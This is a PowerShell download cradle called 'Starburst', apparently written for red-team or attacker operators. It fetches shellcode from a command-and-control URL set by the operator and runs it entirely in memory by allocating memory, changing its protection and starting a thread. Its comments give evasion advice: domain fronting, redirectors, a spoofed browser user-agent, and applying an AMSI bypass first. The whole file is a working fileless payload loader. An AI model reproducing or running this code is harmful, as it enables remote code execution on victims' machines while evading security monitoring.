# ============================================================================
# Starburst Download Cradle - In-Memory Execution
# ============================================================================
# Technique:  Download shellcode from URL, execute entirely in memory
# OPSEC Notes:
#   - Shellcode never touches disk - download directly to memory.
#   - Network connection to payload URL is visible to network monitoring.
#   - Use HTTPS to encrypt the payload in transit.
#   - Consider domain fronting or redirectors to obscure the true destination.
#   - AMSI will inspect this script. Apply AMSI bypass before execution.
#   - ScriptBlock logging captures the full script.
#   - WebClient/Invoke-WebRequest user-agent string may be flagged.
#   - Proxy-aware by default (inherits system proxy settings).
#   - TLS 1.2 is forced to ensure compatibility with modern infrastructure.
# ============================================================================

# --- OPERATOR: Set payload URL ---
$PayloadUrl = "https://your-c2-server.com/starburst.bin"

# Force TLS 1.2
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# P/Invoke definitions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32Cradle {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Download shellcode into memory - never touches disk
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$WebClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$WebClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

try {
    [Byte[]]$Shellcode = $WebClient.DownloadData($PayloadUrl)
} catch {
    Write-Error "Failed to download payload: $_"
    exit 1
} finally {
    $WebClient.Dispose()
}

if ($Shellcode.Length -eq 0) {
    Write-Error "Downloaded payload is empty"
    exit 1
}

# Constants
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$INFINITE = 0xFFFFFFFF

# Allocate RW memory
$Address = [Win32Cradle]::VirtualAlloc(
    [IntPtr]::Zero,
    [uint32]$Shellcode.Length,
    ($MEM_COMMIT -bor $MEM_RESERVE),
    $PAGE_READWRITE
)

if ($Address -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed"
    exit 1
}

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Address, $Shellcode.Length)

# Clear shellcode from managed memory
[Array]::Clear($Shellcode, 0, $Shellcode.Length)

# Flip RW to RX
$OldProtect = 0
[Win32Cradle]::VirtualProtect($Address, [uint32]$Shellcode.Length, $PAGE_EXECUTE_READ, [ref]$OldProtect) | Out-Null

# Execute via CreateThread
$ThreadId = 0
$ThreadHandle = [Win32Cradle]::CreateThread(
    [IntPtr]::Zero, 0, $Address, [IntPtr]::Zero, 0, [ref]$ThreadId
)

if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed"
    exit 1
}

[Win32Cradle]::WaitForSingleObject($ThreadHandle, $INFINITE) | Out-Null
[Win32Cradle]::CloseHandle($ThreadHandle) | Out-Null
